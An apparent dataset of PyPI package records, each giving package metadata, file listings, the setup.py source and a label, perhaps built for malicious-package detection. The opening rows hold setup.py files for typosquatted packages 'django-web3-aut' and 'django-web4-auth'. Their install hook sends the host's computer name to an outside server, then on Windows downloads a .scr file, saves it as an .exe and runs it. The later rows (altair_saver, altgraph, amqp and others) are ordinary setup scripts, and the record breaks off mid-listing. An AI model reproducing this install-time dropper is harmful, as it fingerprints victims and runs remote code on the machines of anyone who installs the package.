            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-web3-aut',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-web4-auth-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-web4-auth',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
altair_saver-0.5.0,0,1,1,1,0,0,0,0,bar.pdf bar.png bar.svg bar.vg.json bar.vl.json scatter.pdf scatter.png scatter.svg scatter.vg.json scatter.vl.json test_basic.py test_html.py test_node.py test_selenium.py _utils.py __init__.py _basic.py _html.py _node.py _saver.py _selenium.py __init__.py test_core.py test_entrypoint.py test_utils.py __init__.py types.py _core.py _utils.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.md LICENSE Makefile MANIFEST.in mypy.ini PKG-INFO pyproject.toml README.md RELEASING.md requirements-dev.txt requirements.txt setup.cfg setup.py,"import io
import os
import re

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup


def read(path, encoding=""utf-8""):
    path = os.path.join(os.path.dirname(__file__), path)
    with io.open(path, encoding=encoding) as fp:
        return fp.read()


def get_install_requirements(path):
    content = read(path)
    return [req for req in content.split(""\n"") if req != """" and not req.startswith(""#"")]


def version(path):
    """"""Obtain the packge version from a python file e.g. pkg/__init__.py

    See <https://packaging.python.org/en/latest/single_source_version.html>.
    """"""
    version_file = read(path)
    version_match = re.search(
        r""""""^__version__ = ['""]([^'""]*)['""]"""""", version_file, re.M
    )
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")


HERE = os.path.abspath(os.path.dirname(__file__))


# From https://github.com/jupyterlab/jupyterlab/blob/master/setupbase.py,
# BSD licensed
def find_packages(top=HERE):
    """"""
    Find all of the packages.
    """"""
    packages = []
    for d, dirs, _ in os.walk(top, followlinks=True):
        if os.path.exists(os.path.join(d, ""__init__.py"")):
            packages.append(os.path.relpath(d, top).replace(os.path.sep, "".""))
        elif d != top:
            # Do not look for packages in subfolders
            # if current is not a package
            dirs[:] = []
    return packages


setup(
    name=""altair_saver"",
    version=version(""altair_saver/__init__.py""),
    description=""Altair extension for saving charts to various formats."",
    long_description=read(""README.md""),
    long_description_content_type=""text/markdown"",
    author=""Jake VanderPlas"",
    author_email=""jakevdp@gmail.com"",
    url=""http://github.com/altair-viz/altair_saver/"",
    download_url=""http://github.com/altair-viz/altair_saver/"",
    license=""MIT"",
    packages=find_packages(),
    include_package_data=True,
    install_requires=get_install_requirements(""requirements.txt""),
    entry_points={
        ""altair.vegalite.v4.renderer"": [""altair_saver=altair_saver:render""],
        ""altair.vega.v5.renderer"": [""altair_saver=altair_saver:render""],
    },
    python_requires="">=3.6"",
    classifiers=[
        ""Environment :: Console"",
        ""Intended Audience :: Science/Research"",
        ""License :: OSI Approved :: BSD License"",
        ""Natural Language :: English"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
    ],
)
",1
altair_viewer-0.4.0,0,1,1,1,0,0,0,0,listing.json vega-5.10.1.js vega-5.21.0.js vega-5.9.2.js vega-embed-6.2.2.js vega-embed-6.20.0.js vega-embed-6.5.2.js vega-lite-4.0.2.js vega-lite-4.17.0.js vega-lite-4.8.1.js favicon.ico test_entrypoint.py test_event_provider.py test_scripts.py test_utils.py test_viewer.py __init__.py _event_provider.py _scripts.py _utils.py _viewer.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.md LICENSE Makefile MANIFEST.in mypy.ini PKG-INFO pyproject.toml README.md RELEASING.md requirements-dev.txt requirements.txt setup.cfg setup.py,"import io
import os
import re

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

# ==============================================================================
# Utilities
# ==============================================================================


def read(path, encoding=""utf-8""):
    path = os.path.join(os.path.dirname(__file__), path)
    with io.open(path, encoding=encoding) as fp:
        return fp.read()


def get_install_requirements(path):
    content = read(path)
    return [req for req in content.split(""\n"") if req != """" and not req.startswith(""#"")]


def version(path):
    """"""Obtain the packge version from a python file e.g. pkg/__init__.py

    See <https://packaging.python.org/en/latest/single_source_version.html>.
    """"""
    version_file = read(path)
    version_match = re.search(
        r""""""^__version__ = ['""]([^'""]*)['""]"""""", version_file, re.M
    )
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")


HERE = os.path.abspath(os.path.dirname(__file__))


# From https://github.com/jupyterlab/jupyterlab/blob/master/setupbase.py, BSD licensed
def find_packages(top=HERE):
    """"""
    Find all of the packages.
    """"""
    packages = []
    for d, dirs, _ in os.walk(top, followlinks=True):
        if os.path.exists(os.path.join(d, ""__init__.py"")):
            packages.append(os.path.relpath(d, top).replace(os.path.sep, "".""))
        elif d != top:
            # Do not look for packages in subfolders if current is not a package
            dirs[:] = []
    return packages


setup(
    name=""altair_viewer"",
    version=version(""altair_viewer/__init__.py""),
    description=""Viewer for Altair and Vega-Lite visualizations."",
    long_description=read(""README.md""),
    long_description_content_type=""text/markdown"",
    author=""Jake VanderPlas"",
    author_email=""jakevdp@google.com"",
    url=""http://github.com/altair-viz/altair_viewer/"",
    download_url=""http://github.com/altair-viz/altair_viewer/"",
    license=""BSD 3-clause"",
    packages=find_packages(),
    include_package_data=True,
    install_requires=get_install_requirements(""requirements.txt""),
    python_requires="">=3.6"",
    entry_points={
        ""altair.vegalite.v4.renderer"": [""altair_viewer=altair_viewer:render""],
    },
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Intended Audience :: Science/Research"",
        ""License :: OSI Approved :: BSD License"",
        ""Natural Language :: English"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
    ],
)
",1
altgraph-0.17.2,1,1,1,1,0,0,0,0,Dot.py Graph.py GraphAlgo.py GraphStat.py GraphUtil.py ObjectGraph.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt zip-safe test_altgraph.py test_dot.py test_graph.py test_graphstat.py test_graphutil.py test_object_graph.py __init__.py changelog.rst conf.py core.rst dot.rst graph.rst graphalgo.rst graphstat.rst graphutil.rst index.rst license.rst Makefile objectgraph.rst icons.html LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py tox.ini,"""""""
Shared setup file for simple python packages. Uses a setup.cfg that
is the same as the distutils2 project, unless noted otherwise.

It exists for two reasons:
1) This makes it easier to reuse setup.py code between my own
   projects

2) Easier migration to distutils2 when that catches on.

Additional functionality:

* Section metadata:
    requires-test:  Same as 'tests_require' option for setuptools.

""""""

import os
import platform
import re
import sys
from distutils import log
from fnmatch import fnmatch

from setuptools import Command, setup
from setuptools.command import egg_info

if sys.version_info[0] == 2:
    from ConfigParser import RawConfigParser, NoOptionError, NoSectionError
else:
    from configparser import RawConfigParser, NoOptionError, NoSectionError

ROOTDIR = os.path.dirname(os.path.abspath(__file__))


#
#
#
# Parsing the setup.cfg and converting it to something that can be
# used by setuptools.setup()
#
#
#


def eval_marker(value):
    """"""
    Evaluate an distutils2 environment marker.

    This code is unsafe when used with hostile setup.cfg files,
    but that's not a problem for our own files.
    """"""
    value = value.strip()

    class M:
        def __init__(self, **kwds):
            for k, v in kwds.items():
                setattr(self, k, v)

    variables = {
        ""python_version"": ""%d.%d"" % (sys.version_info[0], sys.version_info[1]),
        ""python_full_version"": sys.version.split()[0],
        ""os"": M(name=os.name),
        ""sys"": M(platform=sys.platform),
        ""platform"": M(version=platform.version(), machine=platform.machine()),
    }

    return bool(eval(value, variables, variables))

    return True


def _opt_value(cfg, into, section, key, transform=None):
    try:
        v = cfg.get(section, key)
        if transform != _as_lines and "";"" in v:
            v, marker = v.rsplit("";"", 1)
            if not eval_marker(marker):
                return

            v = v.strip()

        if v:
            if transform:
                into[key] = transform(v.strip())
            else:
                into[key] = v.strip()

    except (NoOptionError, NoSectionError):
        pass


def _as_bool(value):
    if value.lower() in (""y"", ""yes"", ""on""):
        return True
    elif value.lower() in (""n"", ""no"", ""off""):
        return False
    elif value.isdigit():
        return bool(int(value))
    else:
        raise ValueError(value)


def _as_list(value):
    return value.split()


def _as_lines(value):
    result = []
    for v in value.splitlines():
        if "";"" in v:
            v, marker = v.rsplit("";"", 1)
            if not eval_marker(marker):
                continue

            v = v.strip()
            if v:
                result.append(v)
        else:
            result.append(v)
    return result


def _map_requirement(value):
    m = re.search(r""(\S+)\s*(?:\((.*)\))?"", value)
    name = m.group(1)
    version = m.group(2)

    if version is None:
        return name

    else:
        mapped = []
        for v in version.split("",""):
            v = v.strip()
            if v[0].isdigit():
                # Checks for a specific version prefix
                m = v.rsplit(""."", 1)
                mapped.append("">=%s,<%s.%s"" % (v, m[0], int(m[1]) + 1))

            else:
                mapped.append(v)
        return ""%s %s"" % (name, "","".join(mapped))


def _as_requires(value):
    requires = []
    for req in value.splitlines():
        if "";"" in req:
            req, marker = req.rsplit("";"", 1)
            if not eval_marker(marker):
                continue
            req = req.strip()

        if not req:
            continue
        requires.append(_map_requirement(req))
    return requires


def parse_setup_cfg():
    cfg = RawConfigParser()
    r = cfg.read([os.path.join(ROOTDIR, ""setup.cfg"")])
    if len(r) != 1:
        print(""Cannot read 'setup.cfg'"")
        sys.exit(1)

    metadata = {
        ""name"": cfg.get(""x-metadata"", ""name""),
        ""version"": cfg.get(""x-metadata"", ""version""),
        ""description"": cfg.get(""x-metadata"", ""description""),
    }

    _opt_value(cfg, metadata, ""x-metadata"", ""license"")
    _opt_value(cfg, metadata, ""x-metadata"", ""maintainer"")
    _opt_value(cfg, metadata, ""x-metadata"", ""maintainer_email"")
    _opt_value(cfg, metadata, ""x-metadata"", ""author"")
    _opt_value(cfg, metadata, ""x-metadata"", ""author_email"")
    _opt_value(cfg, metadata, ""x-metadata"", ""url"")
    _opt_value(cfg, metadata, ""x-metadata"", ""download_url"")
    _opt_value(cfg, metadata, ""x-metadata"", ""classifiers"", _as_lines)
    _opt_value(cfg, metadata, ""x-metadata"", ""platforms"", _as_list)
    _opt_value(cfg, metadata, ""x-metadata"", ""packages"", _as_list)
    _opt_value(cfg, metadata, ""x-metadata"", ""keywords"", _as_list)

    try:
        v = cfg.get(""x-metadata"", ""requires-dist"")

    except (NoOptionError, NoSectionError):
        pass

    else:
        requires = _as_requires(v)
        if requires:
            metadata[""install_requires""] = requires

    try:
        v = cfg.get(""x-metadata"", ""requires-test"")

    except (NoOptionError, NoSectionError):
        pass

    else:
        requires = _as_requires(v)
        if requires:
            metadata[""tests_require""] = requires

    try:
        v = cfg.get(""x-metadata"", ""long_description_file"")
    except (NoOptionError, NoSectionError):
        pass

    else:
        parts = []
        for nm in v.split():
            fp = open(nm, ""r"")
            parts.append(fp.read())
            fp.close()

        metadata[""long_description""] = ""\n\n"".join(parts)
        metadata[""long_description_content_type""] = ""text/x-rst; charset=UTF-8""

    try:
        v = cfg.get(""x-metadata"", ""zip-safe"")
    except (NoOptionError, NoSectionError):
        pass

    else:
        metadata[""zip_safe""] = _as_bool(v)

    try:
        v = cfg.get(""x-metadata"", ""console_scripts"")
    except (NoOptionError, NoSectionError):
        pass

    else:
        if ""entry_points"" not in metadata:
            metadata[""entry_points""] = {}

        metadata[""entry_points""][""console_scripts""] = v.splitlines()

    if sys.version_info[:2] <= (2, 6):
        try:
            metadata[""tests_require""] += "", unittest2""
        except KeyError:
            metadata[""tests_require""] = ""unittest2""

    return metadata


#
#
#
# Definitions of custom commands
#
#
#


def recursiveGlob(root, pathPattern):
    """"""
    Recursively look for files matching 'pathPattern'. Return a list
    of matching files/directories.
    """"""
    result = []

    for rootpath, _dirnames, filenames in os.walk(root):
        for fn in filenames:
            if fnmatch(fn, pathPattern):
                result.append(os.path.join(rootpath, fn))
    return result


def importExternalTestCases(unittest, pathPattern=""test_*.py"", root=""."", package=None):
    """"""
    Import all unittests in the PyObjC tree starting at 'root'
    """"""

    testFiles = recursiveGlob(root, pathPattern)
    testModules = [
        x[len(root) + 1 : -3].replace(""/"", ""."") for x in testFiles  # noqa: E203
    ]  # noqa: E203
    if package is not None:
        testModules = [(package + ""."" + m) for m in testModules]

    suites = []

    for modName in testModules:
        try:
            module = __import__(modName)
        except ImportError:
            print(""SKIP %s: %s"" % (modName, sys.exc_info()[1]))
            continue

        if ""."" in modName:
            for elem in modName.split(""."")[1:]:
                module = getattr(module, elem)

        s = unittest.defaultTestLoader.loadTestsFromModule(module)
        suites.append(s)

    return unittest.TestSuite(suites)


class my_egg_info(egg_info.egg_info):
    def run(self):
        egg_info.egg_info.run(self)

        path = os.path.join(self.egg_info, ""PKG-INFO"")

        with open(path, ""r"") as fp:
            contents = fp.read()

        try:
            before, after = contents.split(""\n\n"", 1)
        except ValueError:
            before = contents
            after = """"

        with open(path, ""w"") as fp:
            fp.write(before)
            fp.write(
                ""\nProject-URL: Documentation, https://altgraph.readthedocs.io/en/latest/\n""  # noqa: B950
            )
            fp.write(
                ""Project-URL: Issue tracker, https://github.com/ronaldoussoren/altgraph/issues\n""  # noqa: B950
            )
            fp.write(
                ""Project-URL: Repository, https://github.com/ronaldoussoren/altgraph\n\n""  # noqa: B950
            )
            fp.write(after)


class my_test(Command):
    description = ""run test suite""
    user_options = [(""verbosity="", None, ""print what tests are run"")]

    def initialize_options(self):
        self.verbosity = ""1""

    def finalize_options(self):
        if isinstance(self.verbosity, str):
            self.verbosity = int(self.verbosity)

    def cleanup_environment(self):
        ei_cmd = self.get_finalized_command(""egg_info"")
        egg_name = ei_cmd.egg_name.replace(""-"", ""_"")

        to_remove = []
        for dirname in sys.path:
            bn = os.path.basename(dirname)
            if bn.startswith(egg_name + ""-""):
                to_remove.append(dirname)

        for dirname in to_remove:
            log.info(""removing installed %r from sys.path before testing"" % (dirname,))
            sys.path.remove(dirname)

    def add_project_to_sys_path(self):
        from pkg_resources import normalize_path, add_activation_listener
        from pkg_resources import working_set, require

        self.reinitialize_command(""egg_info"")
        self.run_command(""egg_info"")
        self.reinitialize_command(""build_ext"", inplace=1)
        self.run_command(""build_ext"")

        # Check if this distribution is already on sys.path
        # and remove that version, this ensures that the right
        # copy of the package gets tested.

        self.__old_path = sys.path[:]
        self.__old_modules = sys.modules.copy()

        ei_cmd = self.get_finalized_command(""egg_info"")
        sys.path.insert(0, normalize_path(ei_cmd.egg_base))
        sys.path.insert(1, os.path.dirname(__file__))

        # Strip the namespace packages defined in this distribution
        # from sys.modules, needed to reset the search path for
        # those modules.

        nspkgs = getattr(self.distribution, ""namespace_packages"", None)
        if nspkgs is not None:
            for nm in nspkgs:
                del sys.modules[nm]

        # Reset pkg_resources state:
        add_activation_listener(lambda dist: dist.activate())
        working_set.__init__()
        require(""%s==%s"" % (ei_cmd.egg_name, ei_cmd.egg_version))

    def remove_from_sys_path(self):
        from pkg_resources import working_set

        sys.path[:] = self.__old_path
        sys.modules.clear()
        sys.modules.update(self.__old_modules)
        working_set.__init__()

    def run(self):
        import unittest

        # Ensure that build directory is on sys.path (py3k)

        self.cleanup_environment()
        self.add_project_to_sys_path()

        try:
            meta = self.distribution.metadata
            name = meta.get_name()
            test_pkg = name + ""_tests""
            suite = importExternalTestCases(unittest, ""test_*.py"", test_pkg, test_pkg)

            runner = unittest.TextTestRunner(verbosity=self.verbosity)
            result = runner.run(suite)

            # Print out summary. This is a structured format that
            # should make it easy to use this information in scripts.
            summary = {
                ""count"": result.testsRun,
                ""fails"": len(result.failures),
                ""errors"": len(result.errors),
                ""xfails"": len(getattr(result, ""expectedFailures"", [])),
                ""xpass"": len(getattr(result, ""expectedSuccesses"", [])),
                ""skip"": len(getattr(result, ""skipped"", [])),
            }
            print(""SUMMARY: %s"" % (summary,))
            if summary[""fails""] or summary[""errors""]:
                sys.exit(1)

        finally:
            self.remove_from_sys_path()


#
#
#
#  And finally run the setuptools main entry point.
#
#
#

metadata = parse_setup_cfg()

setup(cmdclass={""test"": my_test, ""egg_info"": my_egg_info}, **metadata)
",1
amazon-dax-client-2.0.1,1,1,1,0,1,0,0,0,AmazonDaxClient.py Assemblers.py AttributeValueDecoder.py AttributeValueEncoder.py Cache.py CborDecoder.py CborEncoder.py CborSExprGenerator.py CborTypes.py Cluster.py ClusterUtil.py compat.py Constants.py DaxCborDecoder.py DaxCborTypes.py DaxClient.py DaxError.py DocumentPath.py DynamoDbExpressionParser.py DynamoDbV1Converter.py Stubs.py __init__.py DynamoDbGrammarLexer.py DynamoDbGrammarListener.py DynamoDbGrammarParser.py Tokens.py __init__.py DynamoDbGrammarLexer.py DynamoDbGrammarListener.py DynamoDbGrammarParser.py Tokens.py __init__.py ItemBuilder.py LexDecimal.py RequestValidator.py Resource.py RetryHandler.py Router.py SigV4Gen.py Tube.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in NOTICE.txt PKG-INFO README.rst requirements-dev.txt requirements.txt setup.cfg setup.py,"#!/usr/bin/env python
#
# Copyright 2017 Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License""). You may not
# use this file except in compliance with the License. A copy of the License
# is located at
#
#    http://aws.amazon.com/apache2.0/
#
# or in the ""license"" file accompanying this file. This file is distributed on
# an ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either
# express or implied. See the License for the specific language governing
# permissions and limitations under the License.

import codecs
import os.path
import re
import sys

from setuptools import setup
from setuptools.command.test import test as TestCommand

PY2 = sys.version_info[0] == 2

here = os.path.abspath(os.path.dirname(__file__))

class PyTest(TestCommand):
    user_options = [('pytest-args=', 'a', ""Arguments to pass into py.test"")]

    def __init__(self, *args, **kwargs):
        super(PyTest, self).__init__(*args, **kwargs)
        self.pytest_args = None
        self.test_suite = None

    def initialize_options(self):
        TestCommand.initialize_options(self)
        try:
            from multiprocessing import cpu_count
            self.pytest_args = ['-n', str(cpu_count()), '--boxed']
        except (ImportError, NotImplementedError):
            self.pytest_args = ['-n', '1', '--boxed']

    def finalize_options(self):
        TestCommand.finalize_options(self)
        self.test_args = []
        self.test_suite = True

    def run_tests(self):
        import pytest

        errno = pytest.main(self.pytest_args)
        sys.exit(errno)

def read(*parts):
    return codecs.open(os.path.join(here, *parts), 'r').read()

def find_version(*file_paths):
    version_file = read(*file_paths)
    version_match = re.search(r""^__version__ = ['\""]([^'\""]*)['\""]"",
                              version_file, re.M)
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")

def read_requirements(filename):
    with open(filename, encoding='utf-8') as requirements:
        return [package.strip() for package in requirements]

def read_readme():
    with open('README.rst', encoding='utf-8') as readme:
        return readme.read()

packages = [
    'amazondax',
    'amazondax.generated',
    # Both versions must be included since we don't know where it will end up running
    'amazondax.grammar',
    'amazondax.grammar2'
]


install_requires = read_requirements(""requirements.txt"")
tests_require = read_requirements('requirements-dev.txt')

setup_params = dict(
    name='amazon-dax-client',
    version=find_version(""amazondax"", ""__init__.py""),
    author='Amazon Web Services',
    packages=packages,
    url='https://aws.amazon.com/dynamodb/dax/',
    scripts=[],
    license='Apache License 2.0',
    description='Amazon DAX Client for Python',
    long_description=read_readme(),
    install_requires=install_requires,
    tests_require=tests_require,
    cmdclass={'test': PyTest},
    python_requires='>=3.6',
    classifiers=(
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
    ),
)

setup(**setup_params)
",1
amqp-5.1.1,0,1,1,0,0,0,0,0,abstract_channel.py basic_message.py channel.py connection.py exceptions.py method_framing.py platform.py protocol.py sasl.py serialization.py spec.py transport.py utils.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt Changelog changelog.rst conf.py celery_128.png favicon.ico introduction.txt index.rst make.bat Makefile amqp.abstract_channel.rst amqp.basic_message.rst amqp.channel.rst amqp.connection.rst amqp.exceptions.rst amqp.method_framing.rst amqp.platform.rst amqp.protocol.rst amqp.sasl.rst amqp.serialization.rst amqp.spec.rst amqp.transport.rst amqp.utils.rst index.rst readme.txt .keep sidebardonations.html update_comments_from_spec.py LICENSE MANIFEST.in PKG-INFO README.rst default.txt docs.txt pkgutils.txt test-ci.txt test.txt setup.cfg setup.py conftest.py test_integration.py test_rmq.py __init__.py mocks.py conftest.py test_abstract_channel.py test_basic_message.py test_channel.py test_connection.py test_exceptions.py test_method_framing.py test_platform.py test_sasl.py test_serialization.py test_transport.py test_utils.py __init__.py __init__.py,"#!/usr/bin/env python3

import re
import sys
from os import environ
from pathlib import Path

import setuptools
import setuptools.command.test

NAME = 'amqp'

# -*- Classifiers -*-

classes = """"""
    Development Status :: 5 - Production/Stable
    Programming Language :: Python
    Programming Language :: Python :: 3 :: Only
    Programming Language :: Python :: 3
    Programming Language :: Python :: 3.7
    Programming Language :: Python :: 3.8
    Programming Language :: Python :: 3.9
    Programming Language :: Python :: 3.10
    Programming Language :: Python :: Implementation :: CPython
    Programming Language :: Python :: Implementation :: PyPy
    License :: OSI Approved :: BSD License
    Intended Audience :: Developers
    Operating System :: OS Independent
""""""
classifiers = [s.strip() for s in classes.split('\n') if s]

# -*- Distribution Meta -*-

re_meta = re.compile(r'__(\w+?)__\s*=\s*(.*)')
re_doc = re.compile(r'^""""""(.+?)""""""')


def add_default(m):
    attr_name, attr_value = m.groups()
    return (attr_name, attr_value.strip(""\""'"")),


def add_doc(m):
    return ('doc', m.groups()[0]),


pats = {re_meta: add_default,
        re_doc: add_doc}
here = Path(__file__).parent
meta = {}
for line in (here / 'amqp/__init__.py').read_text().splitlines():
    if line.strip() == '# -eof meta-':
        break
    for pattern, handler in pats.items():
        m = pattern.match(line.strip())
        if m:
            meta.update(handler(m))

# -*- Installation Requires -*-

py_version = sys.version_info
is_jython = sys.platform.startswith('java')
is_pypy = hasattr(sys, 'pypy_version_info')


def strip_comments(l):
    return l.split('#', 1)[0].strip()


def reqs(f):
    lines = (here / 'requirements' / f).read_text().splitlines()
    reqs = [strip_comments(l) for l in lines]
    return list(filter(None, reqs))


# -*- %%% -*-


class pytest(setuptools.command.test.test):
    user_options = [('pytest-args=', 'a', 'Arguments to pass to py.test')]

    def initialize_options(self):
        setuptools.command.test.test.initialize_options(self)
        self.pytest_args = ''

    def run_tests(self):
        import pytest
        pytest_args = self.pytest_args.split(' ')
        sys.exit(pytest.main(pytest_args))


if environ.get(""CELERY_ENABLE_SPEEDUPS""):
    setup_requires = ['Cython']
    ext_modules = [
        setuptools.Extension(
            'amqp.serialization',
            [""amqp/serialization.py""],
        ),
        setuptools.Extension(
            'amqp.basic_message',
            [""amqp/basic_message.py""],
        ),
        setuptools.Extension(
            'amqp.method_framing',
            [""amqp/method_framing.py""],
        ),
        setuptools.Extension(
            'amqp.abstract_channel',
            [""amqp/abstract_channel.py""],
        ),
        setuptools.Extension(
            'amqp.utils',
            [""amqp/utils.py""],
        ),
    ]
else:
    setup_requires = []
    ext_modules = []

setuptools.setup(
    name=NAME,
    packages=setuptools.find_packages(exclude=['ez_setup', 't', 't.*']),
    version=meta['version'],
    description=meta['doc'],
    long_description=(here / 'README.rst').read_text(),
    long_description_content_type=""text/x-rst"",
    keywords='amqp rabbitmq cloudamqp messaging',
    author=meta['author'],
    author_email=meta['contact'],
    maintainer=meta['maintainer'],
    url=meta['homepage'],
    platforms=['any'],
    license='BSD',
    classifiers=classifiers,
    python_requires="">=3.6"",
    install_requires=reqs('default.txt'),
    setup_requires=setup_requires,
    tests_require=reqs('test.txt'),
    cmdclass={'test': pytest},
    zip_safe=False,
    ext_modules=ext_modules,
)
",1
amqplib-1.0.2,0,1,1,1,1,0,0,0,abstract_channel.py basic_message.py channel.py connection.py exceptions.py method_framing.py serialization.py transport.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGES amqp_clock.py demo_receive.py demo_send.py code_layout.txt overview.txt generate_skeleton_0_8.py README INSTALL LICENSE MANIFEST.in PKG-INFO README setup.cfg setup.py fake_redirect.py run_all.py settings.py test_basic_message.py test_channel.py test_connection.py test_exceptions.py test_serialization.py test_with.py TODO,,1
amundsen-common-0.27.1,0,1,1,1,1,0,0,0,resource_type.py __init__.py action_log.py action_log_callback.py action_log_model.py auth_caller_retrieval.py caller_retrieval.py http_header_caller_retrieval.py __init__.py health_check.py __init__.py badge.py dashboard.py feature.py generation_code.py index_map.py lineage.py popular_table.py search.py table.py tag.py user.py __init__.py py.typed fixtures.py __init__.py atlas.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt MANIFEST.in PKG-INFO README.md requirements-dev.txt setup.cfg setup.py,"# Copyright Contributors to the Amundsen project.
# SPDX-License-Identifier: Apache-2.0
import os

from setuptools import find_packages, setup

__version__ = '0.27.1'


requirements_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'requirements-dev.txt')
with open(requirements_path) as requirements_file:
    requirements_dev = requirements_file.readlines()


setup(
    name='amundsen-common',
    version=__version__,
    description='Common code library for Amundsen',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    url='https://github.com/amundsen-io/amundsen/tree/main/common',
    maintainer='Amundsen TSC',
    maintainer_email='amundsen-tsc@lists.lfai.foundation',
    packages=find_packages(exclude=['tests*']),
    install_requires=[
        # Packages in here should rarely be pinned. This is because these
        # packages (at the specified version) are required for project
        # consuming this library. By pinning to a specific version you are the
        # number of projects that can consume this or forcing them to
        # upgrade/downgrade any dependencies pinned here in their project.
        #
        # Generally packages listed here are pinned to a major version range.
        #
        # e.g.
        # Python FooBar package for foobaring
        # pyfoobar>=1.0, <2.0
        #
        # This will allow for any consuming projects to use this library as
        # long as they have a version of pyfoobar equal to or greater than 1.x
        # and less than 2.x installed.
        'Flask>=1.0.2',
        'attrs>=19.0.0',
        'marshmallow>=3.0',
        'marshmallow3-annotations>=1.0.0'
    ],
    extras_require={
        'all': requirements_dev
    },
    python_requires="">=3.7"",
    package_data={'amundsen_common': ['py.typed']},
)
",1
amundsen-databuilder-7.1.2,0,1,1,1,0,0,0,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt call_back.py __init__.py neptune_client.py __init__.py athena_metadata_extractor.py atlas_search_data_extractor.py base_bigquery_extractor.py base_extractor.py base_postgres_metadata_extractor.py base_teradata_metadata_extractor.py bigquery_metadata_extractor.py bigquery_usage_extractor.py bigquery_watermark_extractor.py cassandra_extractor.py csv_extractor.py apache_superset_chart_extractor.py apache_superset_extractor.py apache_superset_metadata_extractor.py apache_superset_table_extractor.py __init__.py databricks_sql_dashboard_extractor.py databricks_sql_dashboard_utils.py __init__.py mode_dashboard_charts_batch_extractor.py mode_dashboard_constants.py mode_dashboard_executions_extractor.py mode_dashboard_extractor.py mode_dashboard_last_modified_timestamp_extractor.py mode_dashboard_last_successful_executions_extractor.py mode_dashboard_owner_extractor.py mode_dashboard_queries_extractor.py mode_dashboard_usage_extractor.py mode_dashboard_user_extractor.py mode_dashboard_utils.py __init__.py redash_dashboard_extractor.py redash_dashboard_utils.py __init__.py tableau_dashboard_constants.py tableau_dashboard_extractor.py tableau_dashboard_last_modified_extractor.py tableau_dashboard_query_extractor.py tableau_dashboard_table_extractor.py tableau_dashboard_utils.py tableau_external_table_extractor.py __init__.py __init__.py db2_metadata_extractor.py dbt_extractor.py db_api_extractor.py delta_lake_metadata_extractor.py dremio_metadata_extractor.py druid_metadata_extractor.py es_base_extractor.py es_column_stats_extractor.py es_last_updated_extractor.py es_metadata_extractor.py es_watermark_extractor.py eventbridge_extractor.py feast_extractor.py generic_extractor.py generic_usage_extractor.py glue_extractor.py hive_table_last_updated_extractor.py hive_table_metadata_extractor.py kafka_source_extractor.py mssql_metadata_extractor.py mysql_metadata_extractor.py mysql_search_data_extractor.py neo4j_extractor.py neo4j_search_data_extractor.py neptune_search_data_extractor.py openlineage_extractor.py oracle_metadata_extractor.py pandas_profiling_column_stats_extractor.py postgres_metadata_extractor.py presto_view_metadata_extractor.py redshift_metadata_extractor.py rest_api_extractor.py __init__.py salesforce_extractor.py snowflake_metadata_extractor.py snowflake_table_last_updated_extractor.py sql_alchemy_extractor.py table_metadata_constants.py teradata_metadata_extractor.py bamboohr_user_extractor.py __init__.py __init__.py vertica_metadata_extractor.py __init__.py filesystem.py metadata.py __init__.py base_job.py job.py __init__.py base_loader.py file_system_atlas_csv_loader.py file_system_csv_loader.py file_system_elasticsearch_json_loader.py 